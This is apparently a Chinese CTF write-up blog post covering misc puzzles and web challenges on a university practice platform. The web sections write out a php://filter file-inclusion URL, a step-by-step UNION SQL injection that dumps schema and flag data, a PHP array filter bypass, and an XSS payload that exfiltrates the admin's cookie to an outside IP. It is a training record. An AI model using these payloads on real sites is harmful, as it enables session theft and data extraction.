---
layout: post
title: "day9 ouc_oj"
date:  2020-05-25 14:58:44
description: "day9 wp"
tag: 总结
---

> 论文终于给老师检查完了，还是有需要修改的地方，不过终于可以做题咯

# Misc Part

###  day9-Poem

看图结合蛤->想起一句诗，把诗输入，get flag



### day9-LSB

题目给解法了，扫码，get flag

![image-20200525224755129](/images/oj_wp/image-20200525224755129.png)



### day9-Exif

使用电脑查看exif信息，看样子是ascii码，解码，get flag

```python
str = "102,108,97,103,123,101,120,105,102,95,104,105,100,100,101,110,95,102,108,52,103,125"
list = str.split(',')
flag=''
for i in list:
	flag += chr(int(i))
print(flag)
```

![image-20200525225700404](/images/oj_wp/image-20200525225700404.png)



### day9-Another 01Game

按照题目所给的思路，写脚本将题目给的01字符串生成图片

```python
#!/usr/bin/env python
from PIL import Image
MAX = 37
pic = Image.new("RGB",(MAX, MAX))
file = open("1.txt",'r')
m = file.read()
print(len(m))
i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(m[i] == '0'):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1
pic.show()
pic.save("flag.png")
```

扫码获得01字符串`110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101`

长度为189，ascii码的最大值为127，也就是0b11111，长度为7

把获得的01字符串按7个一组进行ascii解码，获得flag

```python
#coding:utf-8
import re
a = "110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101"

result = re.findall(r'.{7}', a)
print(result)
flag = ""
for i in result:
    tmp = int(i, 2)
    flag += chr(tmp)
print(flag)
```



### day9-docx

word的本质是zip，修改文件后缀为zip，打开get flag



### day9-Forensics1

Wireshark打开文件，然后追踪http流，发现有一组数据中提到flag和一个s3cret.png文件，提取图片，get flag



### day9-Forensics2

使用`binwalk -e xx.pcap `命令，即可提取出flag.txt文件



# Web Part

### day 9-BasicFileInclude

#### 题目描述：

![image-20200525214432331](/images/oj_wp/image-20200525214432331.png)

#### 解题思路：

这是一道文件包含的题目。这道题中一共有两个页面，一个是home，一个是flag，访问flag page：`ha ha? you want flag? flag is here, but don't let you see!`，可以看出flag应该在这个页面中，但是没有显示出来。

想要获取被隐藏的内容需要使用PHP伪协议，这里的目的是读取flag文件，所以应当使用`php://filter`来读取源码。

构造URL：

```
http://vps1.blue-whale.me:23338/?page=php://filter/read=convert.base64-encode/resource=flag
```

其中`read`的过滤器为base64，意为把输入流进行base64编码；`resource`指的是所要读取的文件

![image-20200525215718596](/images/oj_wp/image-20200525215718596.png)

对获取到的内容进行base64解码，得到以下内容，get flag

```php
ha ha? you want flag? flag is here<?php
// try to read this source code
//$flag = 'flag{really***should_know}';
?>, but don't let you see!
```



### day 9-Basic SQL

#### 题目描述：

![image-20200525220221182](/images/oj_wp/image-20200525220221182.png)

#### 解题思路：

在搜索框中输入`hello`，正常。

输入`hello'`，页面500错误，可以注入



输入`hello' order by 1 #`，正常

输入`hello' order by 2 #`，正常

输入`hello' order by 3 #`，正常

输入`hello' order by 4 #`，500错误，从未判断数据表有三列

输入`hello' union select 1,2,3#`，news中显示`2` ` 3`，可知2，3位置为回显点



查找数据库名：输入`hello' union select 1,database(),3#`，news中显示`news ` `3`，可知库名为`news`

查找数据库的表名：输入`hello' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#`，news中显示`f1agfl4gher3,news` `3`,所以存在名为`f1agfl4gher3`与`news`的表

查找`f1agfl4gher3`中的字段名：`hello' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='f1agfl4gher3'#`，news中显示`id,h3r31sfl4g` `3`

查询`h3r31sfl4g`中的数据：`hello' union select 1,h3r31sfl4g,3 from f1agfl4gher3#`，news中显示`flag{sql***hack}`，get flag



### day9-Welcome to web

#### 题目描述：

```php
<?php
	if(isset($_GET['key'])){
		if($_GET['key'] == 'areyousure'){
			echo 'For this exercise, flag is: ******';
		}
	}
?>
```

构造URL：`http://vps1.blue-whale.me:23331/php0/?key=areyousur`,get flag



### day 6 BabyXSS

> 这两天在写论文，所以一直没有做题...

#### 题目描述：

![image-20200522231507580](/images/oj_wp/image-20200522231507580.png)

![image-20200522231538713](/images/oj_wp/image-20200522231538713.png)

#### 解题思路：

注意到最下面有个MD5验证，写脚本爆破：

```python
# -*- coding:utf-8 -*-
import hashlib
code = '25fdee'

def MD5(str):
    return hashlib.md5(str).hexdigest()
    
for i in range(0, 9999999):
    md5 = MD5(str(i))
    if md5[:6] == code:
        print(i)
        exit(0)
```

提交`<script>alert(1);</script>`测试留言板的过滤情况

![image-20200522233240420](/images/oj_wp/image-20200522233240420.png)

显示留言成功并在管理员查看队列中，然后访问留言，发现弹窗，查看网页源代码，留言页面没有过滤`script`标签。

![image-20200522233437142](/images/oj_wp/image-20200522233437142.png)

尝试构造语句获取cookie，其中地址是接收服务器的地址：

```javascript
<script>var img = document.createElement("img");
img.src = "http://139.199.31.158/log?"+escape(document.cookie);
document.body.appendChild(img);</script>
```

服务器接收到了admin的cookie，

![C060424737C3DD81BEBD02319F001DEA](/images/oj_wp/C060424737C3DD81BEBD02319F001DEA.png)

使用这个cookie访问admin.php即可获得flag

![image-20200523000907465](/images/oj_wp/image-20200523000907465.png)



### day3-Basic PHP 2

#### 题目描述：

![image-20200519205227987](/images/oj_wp/image-20200519205227987.png)

![image-20200519205317245](/images/oj_wp/image-20200519205317245.png)

#### 解题思路

try写个shell进去，但是又过滤了`<` 和`php`，对于stripos()函数可以使用数组绕过，传入`？content[]=<?php>`，显示success后访问./config.php，就获得了flag...

8继续肝论文去了QAQ

![image-20200519205631617](/images/oj_wp/image-20200519205631617.png)



### day2-Rapid Typing

#### 题目描述

![image-20200518180932073](/images/oj_wp/image-20200518180932073.png)

#### 解题思路：

抓包发现base64，解码得到一个html，用BeautifulSoup就可以了，一开始没注意还有坐标问题，试了好几次都不对==、

![image-20200518180842561](/images/oj_wp/image-20200518180842561.png)

今天只做了一个题，希望赶紧把毕设搞完就可以愉快地做题了

### day1-Calculator

#### 题目描述：

![image-20200517224348519](/images/oj_wp/image-20200517224348519.png)



#### 解题思路：

既然题目要求在1.5s内解出答案，肯定得用脚本了。抓包获取cookies然后放在脚本里就OK了，脚本猜测有写得更简洁的方法，但我暂时想到的就是这样。

![image-20200517153139132](/images/oj_wp/image-20200517153139132.png)

#### 解题脚本

```python
import re
import requests
#发送post和get请求的url
get_url = 'http://vps1.blue-whale.me:23331/calculator/'
send_url = 'http://vps1.blue-whale.me:23331/calculator/?answer='
#利用get方法获取网页数据
cookies = '<RequestsCookieJar[<Cookie PHPSESSID=dfa32c999a84f176eb4327e27660e3a9 for vps1.blue-whale.me/>]>'
r = requests.get(get_url)
#构造与匹配正则表达式
str_text = r"<span id=\"exp\">.*= </span>"
match = re.search(str_text,r.text)
#处理匹配后的结果
result = match.group().replace("<span id=\"exp\">","")
result = result.replace("= </span>","")
result = eval(result)
cookies=r.cookies
response = requests.get(send_url+str(result), cookies=r.cookies)
response.encoding = response.apparent_encoding
print(response.content)
```

#### 返回内容

```html
b'<!DOCTYPE html>\r\n<html>\r\n<head>\r\n\t<title>Calculator</title>\r\n\t<style type="text/css">\r\n\t\t.line_input{\r\n\t\t\tborder-width: 1px;\r\n\t\t\tborder-bottom: solid;\r\n\t\t\tborder-top: none;\r\n\t\t\tborder-left: none;\r\n\t\t\tborder-right: none;\r\n\t\t\tborder-width: 1px;\r\n\t\t\ttext-align: center;\r\n\t\t\toutline: none;\r\n\t\t\tmargin: 0 1em;\r\n\t\t}\r\n\t</style>\r\n</head>\r\n<body>\r\n<center>\r\n<h1>Yet Another Calculator</h1>\r\nflag{yes_you_are_calculat0r}<br />Time elapsed: 0.23214817047119 s<br />\r\n</center>\r\n</body>\r\n</html>'
```

![image-20200517121543980](/images/oj_wp/image-20200517121543980.png)



### day1-PHP's basic feature

#### 题目描述

```PHP 
<!DOCTYPE html>
<html>
<head>
    <title>Exercise</title>
    <meta charset="UTF-8">
</head>
<body>
<h1>PHP's basic feature</h1><!--好吧其实是老套路了-->
<?php
require_once('flag.php');

if (isset($_GET['name']) and isset($_GET['password']) && isset($_GET['test'])){
    // ========== Stage 1 ========== 
    $test=$_GET['test']; 
    $test=md5($test); 

    if($test=='0') { 
        print 'You passed stage 1.<br />';
    }
    else{
        print "Game over at stage 1."; 
        exit();
    }

    // ========== Stage 2 ========== 
    if ($_GET['name'] == $_GET['password']){
        print 'Your password can not be your name.';
        exit();
    }
    else if (sha1($_GET['name']) === sha1($_GET['password'])){
        print 'You passed stage 2.<br />';
        print 'Flag: '.$flag;
    }
    else{
        print 'Invalid password';
        exit();
    }
}
echo '<hr />';
show_source(__FILE__);
?>
</body>
</html>
```

#### 解题思路

有一些字符串md5加密后以0e开头，PHP在使用这些字符串时，会将字符串当作科学技术法来解释为0，从而使`==`成立。

![image-20200517155517748](/images/oj_wp/image-20200517155517748.png)
